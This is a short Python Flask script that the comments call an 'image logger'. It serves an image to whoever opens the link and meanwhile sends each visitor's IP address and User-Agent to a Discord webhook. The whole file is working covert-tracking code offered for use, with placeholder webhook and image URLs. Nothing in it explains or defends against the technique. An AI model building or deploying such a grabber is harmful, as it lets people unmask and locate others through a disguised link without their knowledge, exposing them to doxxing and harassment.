from flask import Flask, request, send_file
import requests

app = Flask(__name__)

# Your Discord webhook URL to receive logs
WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'

# The image you want to show visitors (must be a direct link to an image)
IMAGE_URL = 'https://example.com/sample-image.jpg'

def send_log(ip, user_agent):
    data = {
        "content": f"Image logger triggered!\nIP: {ip}\nUser-Agent: {user_agent}"
    }
    requests.post(WEBHOOK_URL, json=data)

@app.route('/')
def image_logger():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    # Log visitor info to Discord webhook
    send_log(visitor_ip, user_agent)
    
    # Serve the image to the visitor
    img_resp = requests.get(IMAGE_URL, stream=True)
    return send_file(img_resp.raw, mimetype='image/jpeg')

if __name__ == '__main__':
    app.run()
